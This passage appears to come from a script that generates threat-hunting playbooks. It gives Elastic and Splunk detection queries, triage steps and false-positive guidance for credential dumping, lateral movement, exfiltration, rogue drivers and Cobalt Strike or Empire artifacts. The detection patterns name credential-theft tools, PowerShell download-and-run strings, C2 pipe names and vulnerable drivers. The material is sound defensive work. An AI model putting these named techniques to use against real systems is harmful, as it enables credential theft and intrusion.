(process.name: "vssadmin.exe" AND process.command_line: (*create* AND *shadow*)) OR
(process.name: "esentutl.exe" AND process.command_line: (*ntds*))
```

### SPL - LSASS Access with Suspicious Access Masks (Splunk)

```spl
index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
| where NOT match(SourceImage, "(?i)(csrss|wininit|wmiprvse|svchost|MsMpEng|MsSense|crowdstrike|sentinelone)")
| eval access_hex = GrantedAccess
| where access_hex IN ("0x1010", "0x1410", "0x1438", "0x143a", "0x1fffff")
| stats count, values(SourceImage) as source_procs, values(access_hex) as access_masks
  by Computer, User
| sort - count
```

### SPL - DCSync Detection via Replication Requests (Splunk)

```spl
index=wineventlog EventCode=4662
| where match(Properties, "(?i)(1131f6aa|1131f6ad|89e95b76)")
| where NOT match(SubjectUserName, "(?i)(\\$|MSOL_|AAD_)")
| stats count, values(SubjectUserName) as users, values(ObjectName) as targets
  by Computer
| where count > 0
```

### EQL - Credential Dumping Tool Execution (Elastic)

```eql
process where process.name : ("mimikatz.exe", "procdump.exe", "procdump64.exe",
  "comsvcs.exe", "nanodump.exe", "pypykatz.exe", "secretsdump.exe") or
  (process.name == "rundll32.exe" and
   process.args : "*comsvcs.dll*" and process.args : "*MiniDump*") or
  (process.name == "powershell.exe" and
   process.command_line : ("*sekurlsa*", "*MiniDumpWriteDump*", "*Out-Minidump*"))
```

### EQL - Shadow Copy Creation Followed by NTDS Access (Elastic)

```eql
sequence by host.id with maxspan=10m
  [process where process.name == "vssadmin.exe" and
   process.args : "create" and process.args : "shadow"]
  [file where file.name : "ntds.dit" or
   file.path : "*\\NTDS\\*"]
```

## Expected Results

- Processes reading LSASS memory with access masks 0x1010, 0x1410, or 0x1fffff
- Known tools such as mimikatz, procdump, comsvcs MiniDump, nanodump, pypykatz
- reg.exe saving SAM, SECURITY, or SYSTEM hives to non-standard locations
- ntdsutil.exe creating IFM (Install From Media) snapshots
- vssadmin.exe creating volume shadow copies followed by access to NTDS.dit
- AD replication requests from a non-DC machine account indicating DCSync
- Event 4662 with GUIDs for DS-Replication-Get-Changes properties

## Triage Steps

1. **Identify the tool and technique**: Determine if LSASS was accessed via direct memory read, process dump, or injection.
2. **Check the source process**: Is it a known credential dumping tool? Is it a LOLBin being abused such as comsvcs.dll via rundll32?
3. **Verify the user context**: Which account was used? Is it a compromised admin, service account, or SYSTEM?
4. **Assess the blast radius**: If LSASS was dumped, all credentials cached in memory are compromised. Identify all users who were logged on.
5. **For DCSync**: Identify the source IP. If it is not a domain controller, this is definitively malicious.
6. **Check for downstream activity**: Look for Pass-the-Hash, Pass-the-Ticket, or new logon events using compromised credentials.
7. **Immediate response**: Reset passwords for all accounts present in LSASS on the compromised host. For DCSync, reset the krbtgt account twice.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| EDR/AV scanning LSASS | Known EDR process names; access mask is typically 0x0400 or 0x0010 |
| Windows Defender | MsMpEng.exe with legitimate access patterns |
| LAPS password retrieval | Legitimate AD admin activity correlating with LAPS policy |
| AD replication between DCs | Source is a DC computer account ending with dollar sign |
| Azure AD Connect | MSOL_ or AAD_ prefixed accounts performing replication |

## Hardening Recommendations

- Enable Credential Guard on Windows 10/11 and Server 2016+ to protect LSASS
- Enable LSA RunAsPPL to prevent unsigned processes from accessing LSASS
- Monitor and restrict DCSync rights (Replicating Directory Changes)
- Implement tiered administration to limit domain admin logon exposure

## References

- Microsoft: Credential Guard Overview
- SpecterOps: Attacking Active Directory with DCSync
- Understanding LSASS access mask requirements for credential extraction
"""
    ))

    # ---------- Article 6 ----------
    articles.append((
        "Hunting for Lateral Movement via RDP, SMB, and WMI",
        ["threat-hunting", "lateral-movement", "rdp", "smb", "wmi", "network", "endpoint"],
        r"""# Hunting for Lateral Movement via RDP, SMB, and WMI

## Overview

After gaining initial access and harvesting credentials, adversaries move
laterally through the network to reach high-value targets. The three most common
Windows-native lateral movement methods are Remote Desktop Protocol (RDP),
Server Message Block (SMB) for file copy and service execution, and Windows
Management Instrumentation (WMI) for remote process execution. Detecting these
requires correlating authentication events, network connections, and process
creation across multiple hosts.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1021.001 | Remote Services: Remote Desktop Protocol | Lateral Movement |
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Lateral Movement |
| T1047 | Windows Management Instrumentation | Execution |
| T1021.006 | Remote Services: Windows Remote Management | Lateral Movement |
| T1570 | Lateral Tool Transfer | Lateral Movement |

## Hypothesis

An adversary with valid credentials is moving laterally across the network
using RDP, SMB, or WMI to access additional hosts, deploy tools, and progress
toward their objectives, generating anomalous authentication and remote
execution patterns that deviate from normal administrative activity.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Windows Security | Event 4624/4625 Logon | LogonType, TargetUserName, SourceNetworkAddress |
| Windows Security | Event 4648 Explicit Creds | TargetServerName, SubjectUserName |
| Sysmon | Event 1 Process Create | process.name, parent, command_line |
| Sysmon | Event 3 Network Connection | destination.ip, destination.port |
| Windows RDP | Event 1149 RDP User Auth | Source Network Address |
| Firewall / NetFlow | Connection logs | src_ip, dst_ip, dst_port 3389 445 135 |

## Detection Queries

### KQL - RDP Lateral Movement from Non-Admin Workstations (Elastic)

```kql
event.code: "4624" AND winlog.event_data.LogonType: "10" AND
NOT source.ip: ("10.10.0.*" OR "192.168.1.*") AND
NOT user.name: ("admin*" OR "svc_*")
```

### KQL - SMB Lateral Movement Indicators (Elastic)

```kql
event.code: "4624" AND winlog.event_data.LogonType: "3" AND
NOT source.ip: "127.0.0.1" AND
NOT user.name: ("*$" OR "ANONYMOUS LOGON") AND
source.ip: *
| stats count() by source.ip, user.name, host.name
| where count > 5
```

### KQL - WMI Remote Process Creation (Elastic)

```kql
process.parent.name: "WmiPrvSE.exe" AND
process.name: ("cmd.exe" OR "powershell.exe" OR "mshta.exe" OR "rundll32.exe" OR "regsvr32.exe")
```

### SPL - RDP Brute Force and Anomalous Logon (Splunk)

```spl
index=wineventlog (EventCode=4624 OR EventCode=4625) LogonType=10
| stats count(eval(EventCode=4625)) as failures,
        count(eval(EventCode=4624)) as successes,
        values(TargetUserName) as users,
        values(IpAddress) as source_ips
  by Computer
| where failures > 10 OR (successes > 0 AND mvcount(source_ips) > 3)
| sort - failures
```

### SPL - Lateral Movement Chain Detection (Splunk)

```spl
index=wineventlog EventCode=4624 LogonType IN (3, 10)
| where NOT match(TargetUserName, "\$$")
| sort 0 _time
| streamstats current=f last(Computer) as prev_host, last(_time) as prev_time by TargetUserName
| eval hop_interval = _time - prev_time
| where hop_interval < 3600 AND prev_host != Computer
| stats count,
        values(Computer) as hosts_accessed,
        dc(Computer) as unique_hosts,
        values(IpAddress) as source_ips
  by TargetUserName
| where unique_hosts > 3
| sort - unique_hosts
```

### SPL - WMI Remote Execution Detection (Splunk)

```spl
index=sysmon EventCode=1 ParentImage="*\\WmiPrvSE.exe"
| where NOT match(Image, "(?i)(wmiprvse|wmiapsrv|scrcons|mofcomp)")
| stats count, values(Image) as child_processes, values(CommandLine) as commands
  by Computer, User
| sort - count
```

### EQL - Lateral Movement Sequence via SMB (Elastic)

```eql
sequence by source.ip with maxspan=30m
  [authentication where event.code == "4624" and
   winlog.event_data.LogonType == "3" and
   not user.name : "*$"]
  [file where file.path : ("*\\ADMIN$\\*", "*\\C$\\*", "*\\IPC$\\*")]
  [process where event.action == "start" and
   process.parent.name : ("services.exe", "cmd.exe")]
```

## Expected Results

- Single user account authenticating to multiple hosts within a short timeframe
- RDP logons (Type 10) from workstations that are not IT admin jump boxes
- SMB logons (Type 3) followed by file writes to admin shares ADMIN$ or C$
- WmiPrvSE.exe spawning cmd.exe, powershell.exe, or other unexpected children
- Pass-the-Hash indicators: Type 3 logons with NTLM from users who rarely use that protocol
- Explicit credential logons (4648) where SubjectUserName differs from target
- Network connections on port 3389, 445, or 135/5985 from non-admin source hosts

## Triage Steps

1. **Map the movement chain**: Plot source IP to destination host to user account on a timeline. Identify the origin host.
2. **Verify the account**: Is the user account legitimate for accessing those hosts? Check with the user or their manager.
3. **Check the source host**: Look for initial compromise indicators on the first host in the chain.
4. **Examine actions on target hosts**: What was executed after logon? Check for file drops, service installs, registry changes, further movement.
5. **Correlate with credential dumping**: Did the source host show LSASS access or credential dumping activity before lateral movement?
6. **Network segmentation review**: Should the source host have been able to reach the target on port 3389/445/135?
7. **Contain and remediate**: Disable the compromised account, isolate affected hosts, reset credentials.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| IT admin remote management | Expected from jump box IPs; scheduled maintenance windows |
| SCCM/Intune management | Machine account authentication; known SCCM server IPs |
| Vulnerability scanners | Known scanner IPs; authenticated scans use service accounts |
| Monitoring tools such as SCOM | Known service accounts; predictable patterns |
| Shared service accounts | Document and alert on anomalous use patterns |

Maintain a baseline of normal lateral movement patterns including admin jump
boxes and IT service accounts, and alert only on deviations from that baseline.

## References

- JPCERT: Detecting Lateral Movement Through Tracking Event Logs
- Mandiant: Windows Lateral Movement Cheat Sheet
- Microsoft: Securing Privileged Access using SAW/PAW model
"""
    ))

    # ---------- Article 7 ----------
    articles.append((
        "Hunting for Data Staging and Exfiltration Patterns",
        ["threat-hunting", "data-exfiltration", "data-staging", "collection", "archive", "network"],
        r"""# Hunting for Data Staging and Exfiltration Patterns

## Overview

Before exfiltrating data, adversaries typically collect and stage files into
a central location, often compressing or encrypting them to reduce volume and
avoid content inspection. Detecting the staging phase is critical because it
provides a window of opportunity to intervene before data leaves the network.
This playbook covers hunting for collection, compression, staging, and
exfiltration behaviours.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1560.001 | Archive Collected Data: Archive via Utility | Collection |
| T1074.001 | Data Staged: Local Data Staging | Collection |
| T1074.002 | Data Staged: Remote Data Staging | Collection |
| T1048.002 | Exfiltration Over Alternative Protocol: Asymmetric Encrypted Non-C2 | Exfiltration |
| T1041 | Exfiltration Over C2 Channel | Exfiltration |
| T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Exfiltration |

## Hypothesis

An adversary is collecting sensitive files, staging them in a central directory,
and compressing or encrypting them prior to exfiltration via network channels,
cloud storage services, or removable media.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Sysmon | Event 1 (Process Create) | process.name, command_line for archiving tools |
| Sysmon | Event 11 (File Create) | file.path, file.name, file.extension |
| Sysmon | Event 3 (Network Connection) | destination.ip, bytes_sent |
| Proxy Logs | Web proxy | url, bytes_uploaded, content_type, user_agent |
| DLP | Data Loss Prevention | policy_violated, file_name, destination |
| Cloud API | M365, Google Workspace audit | file.shared, sharing_link_created, download |

## Detection Queries

### KQL - Archive Utility Execution with Suspicious Parameters (Elastic)

```kql
process.name: ("7z.exe" OR "7za.exe" OR "rar.exe" OR "WinRAR.exe" OR "zip.exe" OR "tar.exe") AND
process.command_line: (*password* OR *-p* OR *-hp* OR *-m* OR *Documents* OR *Desktop* OR
                       *\\Users\\* OR *\\Shares\\* OR *secret* OR *confidential*)
```

### KQL - Large File Creation in Staging Directories (Elastic)

```kql
event.category: "file" AND event.action: "creation" AND
file.extension: ("zip" OR "rar" OR "7z" OR "tar" OR "gz" OR "cab" OR "iso") AND
file.path: (*\\Temp\\* OR *\\ProgramData\\* OR *\\Public\\* OR *\\Recycle*) AND
file.size > 104857600
```

### SPL - Bulk File Copy to Staging Location (Splunk)

```spl
index=sysmon EventCode=11
| where match(TargetFilename, "(?i)(\\\\temp\\\\|\\\\staging\\\\|\\\\public\\\\|\\\\programdata\\\\)")
| bucket _time span=1h
| stats count, dc(TargetFilename) as unique_files,
        sum(FileSize) as total_bytes,
        values(Image) as processes
  by Computer, User, _time
| where unique_files > 50 OR total_bytes > 524288000
| sort - total_bytes
```

### SPL - Exfiltration via Cloud Storage Upload (Splunk)

```spl
index=proxy
| where match(url, "(?i)(dropbox\.com|drive\.google\.com|onedrive\.live\.com|mega\.nz|sendspace|wetransfer|file\.io)")
| where bytes_out > 10485760
| stats sum(bytes_out) as total_uploaded,
        count as upload_count,
        values(url) as destinations,
        values(user) as users
  by src_ip
| where total_uploaded > 104857600
| eval total_mb = round(total_uploaded / 1048576, 2)
| sort - total_uploaded
```

### SPL - Abnormal Outbound Data Volume (Splunk)

```spl
index=firewall action=allowed direction=outbound
| bucket _time span=1h
| stats sum(bytes_out) as hourly_bytes by src_ip, _time
| eventstats avg(hourly_bytes) as avg_bytes, stdev(hourly_bytes) as stdev_bytes by src_ip
| eval z_score = (hourly_bytes - avg_bytes) / stdev_bytes
| where z_score > 3
| sort - z_score
```

### EQL - Archive Creation Followed by Network Upload (Elastic)

```eql
sequence by host.id with maxspan=30m
  [process where process.name : ("7z.exe", "rar.exe", "powershell.exe") and
   process.args : ("*-p*", "*.zip*", "*.rar*", "*.7z*", "*Compress*")]
  [network where destination.port : (443, 80, 8080) and
   not cidrmatch(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")]
```

## Expected Results

- Archive utilities invoked with password-protection flags on files from sensitive directories
- Large archive files (.zip, .rar, .7z) created in Temp, Public, ProgramData, or Recycle Bin
- Bulk file copies from network shares or user directories to a single staging location
- PowerShell Compress-Archive or .NET ZipFile methods used for compression
- Abnormally large uploads to cloud storage or file-sharing services
- Single host uploading significantly more data than its historical baseline
- makecab.exe or compact.exe used to compress files (less common LOLBin approach)

## Triage Steps

1. **Identify the staged files**: What files were collected? Were they from sensitive locations (finance shares, HR data, source code)?
2. **Check the archive contents**: If the archive is still on disk, examine its contents. Password-protected archives are more suspicious.
3. **Identify the user**: Which account performed the collection? Is it a privileged user or a compromised standard account?
4. **Timeline the activity**: Map the collection, staging, and potential exfiltration events. Did the archive disappear after creation (uploaded and deleted)?
5. **Check network logs**: Was there a corresponding large outbound transfer after archive creation? To which destination?
6. **Assess data sensitivity**: Classify the collected data. This determines severity and notification requirements.
7. **Preserve evidence**: Image the staging location and any network captures before remediation.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| Backup software | Scheduled execution, known backup service accounts, writing to backup paths |
| Developer build processes | Archive creation in build directories, CI/CD service accounts |
| Legitimate file sharing | Users sharing via approved cloud platforms within normal volume |
| Database exports | DBA accounts, scheduled jobs, writing to approved export paths |
| Software deployment | SCCM/Intune creating packages, IT service accounts |

Establish data transfer baselines per host and per user. Alert on deviations
exceeding 3 standard deviations from the rolling 30-day average.

## Common Exfiltration Channels

| Channel | Detection Approach | Key Indicators |
|---|---|---|
| HTTPS uploads to cloud storage | Proxy logs, URL categorization | Large POST to Dropbox, Drive, OneDrive, MEGA |
| DNS tunneling | DNS query analysis, entropy | High-entropy subdomain labels, TXT record volume |
| ICMP tunneling | Packet size analysis | Unusually large ICMP payloads, high ICMP frequency |
| FTP/SFTP to external hosts | Firewall logs | Outbound FTP/SFTP to non-corporate IPs |
| Email with attachments | Mail gateway logs | Large attachments to external recipients |
| Removable media | USB device logs, Sysmon | Files copied to USB drives, especially encrypted |
| Steganography | Network anomaly detection | Image uploads with abnormal entropy |
| Custom C2 channel | Beacon analysis | Periodic large outbound transfers over C2 |

## Data Classification Indicators

When assessing the severity of a potential exfiltration event, consider the
types of files being staged:

| File Pattern | Sensitivity Level | Urgency |
|---|---|---|
| *.pst, *.ost (Outlook archives) | High - contains email history | Critical |
| *.kdbx, *.key (password databases) | Critical - credential stores | Critical |
| *.sql, *.bak (database dumps) | High - may contain PII/financial | High |
| *.docx, *.xlsx from finance shares | High - financial data | High |
| Source code repositories (.git) | High - intellectual property | High |
| *.pdf from HR/legal shares | Medium to High depending on content | Medium |
| *.csv, *.json bulk exports | Medium - depends on content | Medium |

## References

- SANS: Detecting Data Exfiltration with Network Analytics
- MITRE ATT&CK Collection and Exfiltration tactic pages
- Microsoft Defender for Cloud Apps: File policy monitoring
- US-CERT: Data Exfiltration Techniques and Indicators
"""
    ))

    # ---------- Article 8 ----------
    articles.append((
        "Hunting for Rogue Services and Drivers",
        ["threat-hunting", "persistence", "privilege-escalation", "services", "drivers", "rootkit", "endpoint"],
        r"""# Hunting for Rogue Services and Drivers

## Overview

Windows services and kernel drivers run with elevated privileges, making them
prime targets for adversaries seeking persistence, privilege escalation, and
defense evasion. Rogue services can execute malicious code as SYSTEM on every
boot, while malicious drivers operate at the kernel level, enabling rootkit
capabilities that can hide processes, files, and network connections from
user-mode security tools.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1543.003 | Create or Modify System Process: Windows Service | Persistence, Privilege Escalation |
| T1543.002 | Create or Modify System Process: Systemd Service | Persistence (Linux parallel) |
| T1014 | Rootkit | Defense Evasion |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation |
| T1547.006 | Boot or Logon Autostart Execution: Kernel Modules and Extensions | Persistence |

## Hypothesis

An adversary is installing malicious Windows services or kernel-mode drivers
to maintain SYSTEM-level persistence, escalate privileges through vulnerable
drivers (BYOVD - Bring Your Own Vulnerable Driver), or deploy rootkit
capabilities to evade detection.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Windows System | Event 7045 (New Service Installed) | ServiceName, ServiceFileName, ServiceType, StartType |
| Windows System | Event 7034/7036 (Service State) | ServiceName |
| Sysmon | Event 6 (Driver Loaded) | ImageLoaded, Signature, SignatureStatus |
| Sysmon | Event 1 (Process Create) | process.name sc.exe, command_line |
| Windows Security | Event 4697 (Service Installed) | ServiceFileName, SubjectUserName |
| Registry | HKLM\SYSTEM\CurrentControlSet\Services | ImagePath, Start, Type |

## Detection Queries

### KQL - New Service Installed with Suspicious Binary Path (Elastic)

```kql
event.code: "7045" AND
NOT winlog.event_data.ImagePath: (*\\Windows\\* OR *\\Program Files\\* OR *\\Program Files (x86)\\*) AND
winlog.event_data.ImagePath: (*\\Temp\\* OR *\\AppData\\* OR *\\ProgramData\\* OR *\\Public\\* OR
                              *cmd* OR *powershell* OR *rundll32* OR *regsvr32* OR *mshta*)
```

### KQL - Unsigned or Untrusted Driver Loaded (Elastic)

```kql
event.code: "6" AND
(winlog.event_data.SignatureStatus: ("Unavailable" OR "Invalid" OR "Expired") OR
 NOT winlog.event_data.Signed: "true")
```

### KQL - sc.exe Creating a New Service (Elastic)

```kql
process.name: "sc.exe" AND
process.command_line: (*create* AND (*binpath* OR *binPath*)) AND
NOT process.parent.name: ("msiexec.exe" OR "setup.exe" OR "TiWorker.exe")
```

### SPL - New Services with Non-Standard Binaries (Splunk)

```spl
index=wineventlog EventCode=7045
| where NOT match(ImagePath, "(?i)(\\\\windows\\\\|\\\\program files)")
| where match(ImagePath, "(?i)(\\\\temp\\\\|\\\\appdata\\\\|\\\\public\\\\|cmd|powershell|rundll32)")
  OR match(ImagePath, "(?i)(\.tmp|\.dat|\.bin|[a-z0-9]{8}\.exe)")
| stats count by ServiceName, ImagePath, ServiceType, StartType, Computer
| sort - count
```

### SPL - Known Vulnerable Drivers (BYOVD) (Splunk)

```spl
index=sysmon EventCode=6
| lookup vulnerable_drivers.csv driver_name as ImageLoaded OUTPUT vuln_cve, risk_level
| where isnotnull(vuln_cve)
| stats count, values(vuln_cve) as cves, values(risk_level) as risk
  by ImageLoaded, Computer
| sort - risk
```

### SPL - Service Binary Replacement (Splunk)

```spl
index=sysmon EventCode=11
  TargetFilename="*\\System32\\drivers\\*" OR TargetFilename="*\\System32\\*.sys"
| where NOT match(Image, "(?i)(TrustedInstaller|TiWorker|svchost|msiexec)")
| stats count by Image, TargetFilename, Computer, User
| sort - count
```

### EQL - Service Installation Followed by Execution (Elastic)

```eql
sequence by host.id with maxspan=5m
  [process where process.name == "sc.exe" and
   process.args : "create" and process.args : "binPath*"]
  [process where process.parent.name == "services.exe" and
   not process.name : ("svchost.exe", "msiexec.exe", "wuauclt.exe")]
```

### EQL - Driver Load from Non-Standard Path (Elastic)

```eql
driver where not dll.path : ("?:\\Windows\\System32\\drivers\\*",
  "?:\\Windows\\System32\\DriverStore\\*",
  "?:\\Program Files\\*",
  "?:\\Program Files (x86)\\*")
```

## Expected Results

- New services (Event 7045) with binary paths pointing to Temp, AppData, or ProgramData
- Service binaries with random-looking names or non-standard extensions
- Services configured to run as SYSTEM with auto-start enabled
- Unsigned or expired-signature kernel drivers being loaded
- Known vulnerable drivers (RTCore64.sys, dbutil_2_3.sys, etc.) loaded for BYOVD exploitation
- sc.exe or PowerShell New-Service invoked by unexpected parent processes
- Driver files written to System32\drivers by processes other than TrustedInstaller

## Triage Steps

1. **Examine the service binary**: Hash it, check VirusTotal, validate digital signature, analyze in sandbox.
2. **Review the service configuration**: Check ServiceType, StartType, account context. Auto-start services running as SYSTEM are highest risk.
3. **Identify the installer**: What process created the service? Check parent chain back to the initial execution.
4. **For drivers**: Verify the signature. Cross-reference against the LOLDrivers project for known vulnerable drivers.
5. **Check persistence**: Will the service/driver survive reboot? Check registry entries under CurrentControlSet\Services.
6. **Assess impact**: If a rootkit driver, assume all user-mode telemetry may be tampered with. Boot from clean media for forensics.
7. **Remediate**: Stop the service, remove the binary, delete the registry key. For BYOVD, patch the vulnerable driver.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| Legitimate software installers | Parent process is msiexec.exe or setup.exe; binary in Program Files; valid signature |
| Windows Update | TrustedInstaller or TiWorker parent; driver in DriverStore |
| Hardware driver installation | User-initiated; driver signed by hardware vendor |
| EDR/AV agent updates | Known service names; signed by security vendor |
| Virtualisation software | VMware, VirtualBox, Hyper-V drivers with valid signatures |

## Known Vulnerable Drivers (BYOVD)

| Driver | CVE | Used By |
|---|---|---|
| RTCore64.sys (MSI Afterburner) | CVE-2019-16098 | BlackByte, Lazarus |
| dbutil_2_3.sys (Dell) | CVE-2021-21551 | AvosLocker |
| gdrv.sys (GIGABYTE) | CVE-2018-19320 | RobbinHood |
| AsIO64.sys (ASUS) | CVE-2023-0057 | Cuba ransomware |
| ProcExp.sys (Sysinternals) | Legitimate but abused | Medusa Locker |

## References

- LOLDrivers Project: https://www.loldrivers.io
- Microsoft: Recommended driver block rules
- Mandiant: BYOVD Attacks in the Wild
"""
    ))

    # ---------- Article 9 ----------
    articles.append((
        "Hunting for PowerShell Empire and Cobalt Strike Artifacts",
        ["threat-hunting", "cobalt-strike", "powershell-empire", "c2-frameworks", "post-exploitation", "endpoint"],
        r"""# Hunting for PowerShell Empire and Cobalt Strike Artifacts

## Overview

Cobalt Strike and PowerShell Empire are the two most commonly observed
post-exploitation frameworks in real-world intrusions. Cobalt Strike uses
Beacon implants with malleable C2 profiles, while PowerShell Empire leverages
PowerShell and Python agents with various stagers. Both frameworks leave
detectable artifacts in process telemetry, network traffic, memory, and
named pipes despite operator efforts to customise and evade detection.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1059.001 | Command and Scripting Interpreter: PowerShell | Execution |
| T1055 | Process Injection | Defense Evasion, Privilege Escalation |
| T1071.001 | Web Protocols | Command and Control |
| T1573 | Encrypted Channel | Command and Control |
| T1620 | Reflective Code Loading | Defense Evasion |
| T1106 | Native API | Execution |

## Hypothesis

A threat actor has deployed Cobalt Strike Beacon or PowerShell Empire agents
in the environment, generating detectable artifacts in PowerShell logging,
process injection events, named pipe creation, network traffic patterns, and
in-memory indicators.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| PowerShell | Script Block Logging (4104) | ScriptBlockText |
| PowerShell | Module Logging (4103) | CommandInvocation |
| Sysmon | Event 1 (Process Create) | command_line, parent |
| Sysmon | Event 8 (CreateRemoteThread) | SourceImage, TargetImage |
| Sysmon | Event 17/18 (Pipe Created/Connected) | PipeName |
| Sysmon | Event 3 (Network) | destination.ip, destination.port |
| EDR | Memory scans, injection detection | injected_module, YARA matches |

## Detection Queries

### KQL - Cobalt Strike Default Named Pipes (Elastic)

```kql
event.code: ("17" OR "18") AND
winlog.event_data.PipeName: (
  "\\MSSE-*" OR "\\postex_*" OR "\\status_*" OR "\\msagent_*" OR
  "\\postex_ssh_*" OR "\\win_svc*" OR "\\ntsvcs*" OR "\\DserNamePipe*" OR
  "\\SearchTextHarvester*" OR "\\mojo.*" OR "\\chrome.*" OR "\\wkssvc*"
)
```

### KQL - PowerShell Suspicious Script Blocks (Elastic)

```kql
event.code: "4104" AND
powershell.file.script_block_text: (
  "*IEX*" OR "*Invoke-Expression*" OR "*Net.WebClient*" OR
  "*DownloadString*" OR "*DownloadData*" OR "*FromBase64String*" OR
  "*Invoke-Shellcode*" OR "*Invoke-Mimikatz*" OR "*Get-GPPPassword*" OR
  "*Invoke-Empire*" OR "*New-Object IO.MemoryStream*" OR
  "*[System.Convert]::FromBase64*" OR "*-bxor*"
)
```

### KQL - Reflective DLL Injection Indicators (Elastic)

```kql
event.code: "8" AND
NOT winlog.event_data.SourceImage: (
  "*\\csrss.exe" OR "*\\svchost.exe" OR "*\\MsMpEng.exe" OR
  "*\\services.exe" OR "*\\lsass.exe"
) AND
winlog.event_data.StartFunction: ("ReflectiveLoader" OR "DllMain" OR "")
```

### SPL - Cobalt Strike HTTP Beacon Pattern (Splunk)

```spl
index=proxy
| where match(url, "(?i)(/submit\.php|/pixel|/__utm\.gif|/ca|/push|/ga\.js|/fwlink)")
| where match(user_agent, "(?i)(Mozilla/[45]\.0.*Windows NT)")
| stats count, avg(bytes_in) as avg_response, stdev(bytes_in) as stdev_response
  by src_ip, dest_host, user_agent
| where count > 100 AND stdev_response < 200
| sort - count
```

### SPL - PowerShell Empire Stager Patterns (Splunk)

```spl
index=wineventlog EventCode=4104
| where match(ScriptBlockText, "(?i)(system\.net\.webclient|downloadstring|downloaddata|invoke-expression|iex|frombase64string)")
| where match(ScriptBlockText, "(?i)(\-enc|\-e\s|\-ec\s|hidden|bypass|nop)")
| rex field=ScriptBlockText "(?i)(?<target_url>https?://[^\s'\"]+)"
| stats count, values(target_url) as urls, values(Computer) as hosts
  by UserName
| sort - count
```

### SPL - CreateRemoteThread from Unexpected Sources (Splunk)

```spl
index=sysmon EventCode=8
| where NOT match(SourceImage, "(?i)(csrss|svchost|MsMpEng|services|lsass|RuntimeBroker|SearchProtocol)")
| where NOT match(TargetImage, "(?i)(csrss|svchost|MsMpEng)")
| stats count, values(SourceImage) as injectors, values(TargetImage) as targets
  by Computer
| where count > 0
| sort - count
```

### EQL - PowerShell Spawning with Encoded Command (Elastic)

```eql
process where process.name == "powershell.exe" and
  process.args : ("-enc*", "-e *", "-ec *", "-EncodedCommand*") and
  process.parent.name : ("cmd.exe", "wscript.exe", "cscript.exe",
    "mshta.exe", "rundll32.exe", "regsvr32.exe", "wmiprvse.exe")
```

### EQL - Cobalt Strike Process Injection Chain (Elastic)

```eql
sequence by host.id with maxspan=10m
  [process where process.name : ("rundll32.exe", "dllhost.exe", "regsvr32.exe") and
   process.args_count <= 1]
  [network where process.name : ("rundll32.exe", "dllhost.exe", "regsvr32.exe") and
   not cidrmatch(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")]
```

## Expected Results

- Named pipes matching default Cobalt Strike pipe patterns (MSSE-*, postex_*, msagent_*)
- PowerShell script blocks containing Base64 decoding, WebClient downloads, and Invoke-Expression chains
- CreateRemoteThread events where source process is not a known legitimate injector
- rundll32.exe or dllhost.exe spawned with no command-line arguments (empty or minimal) making network connections
- Encoded PowerShell commands launched by script interpreters or LOLBins
- Periodic HTTP/HTTPS requests matching Cobalt Strike malleable C2 URIs
- Process hollowing: legitimate process names with unexpected memory regions or network behaviour

## Triage Steps

1. **Decode the payload**: For PowerShell, decode Base64 content to reveal the actual script. For Cobalt Strike, extract the beacon config from memory.
2. **Identify the C2 infrastructure**: Extract IP addresses and domains from decoded payloads or network connections. Check threat intel feeds.
3. **Map the infection chain**: Trace back from the implant to the initial stager execution. Identify the delivery mechanism.
4. **Check for process injection**: Review Sysmon Event 8 (CreateRemoteThread) and Event 10 (ProcessAccess) to map injection targets.
5. **Enumerate named pipes**: Compare active named pipes against known Cobalt Strike defaults and custom profiles.
6. **Memory forensics**: If possible, dump suspicious process memory and scan with YARA rules for Beacon or Empire signatures.
7. **Scope the compromise**: Identify all hosts with similar indicators. Check for lateral movement from the infected host.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| Legitimate PowerShell automation | Known scripts with predictable content; executed by scheduled tasks or automation accounts |
| Software using named pipes | Application-specific pipe names; consistent across environment |
| Browser injections for accessibility | Known accessibility tools; specific target processes |
| .NET applications using reflection | Expected application behaviour; signed binaries |
| Penetration testing activities | Coordinated with security team; from known pentest IPs |

## Cobalt Strike Beacon Configuration Extraction

When you identify a suspected Beacon, use tools like SentinelOne CobaltStrikeParser
or Didier Stevens 1768.py to extract the embedded configuration, revealing:
- C2 server addresses and ports
- Beacon sleep time and jitter
- User-Agent string
- Named pipe names
- Watermark (operator license ID)
- Malleable C2 profile indicators

## References

- Elastic: Hunting for Cobalt Strike Beacons
- SANS: Detecting Empire and Cobalt Strike
- SentinelOne: CobaltStrikeParser
- Cobalt Strike default indicators and malleable C2 profiles
"""
    ))

    # ---------- Article 10 ----------
    articles.append((
        "Hunting for Kerberos Anomalies (Overpass-the-Hash, Pass-the-Ticket)",
        ["threat-hunting", "kerberos", "active-directory", "credential-access", "lateral-movement", "golden-ticket"],
        r"""# Hunting for Kerberos Anomalies (Overpass-the-Hash, Pass-the-Ticket)

## Overview

Kerberos is the default authentication protocol in Active Directory environments.
Adversaries exploit Kerberos through techniques like Overpass-the-Hash (using an
NTLM hash to request a Kerberos TGT), Pass-the-Ticket (stealing and reusing
Kerberos tickets), Golden Ticket (forging TGTs with the krbtgt hash), Silver
Ticket (forging service tickets), and Kerberoasting (requesting service tickets
to crack offline). These attacks can be detected through anomalies in Kerberos
event logs and traffic analysis.

## MITRE ATT&CK References

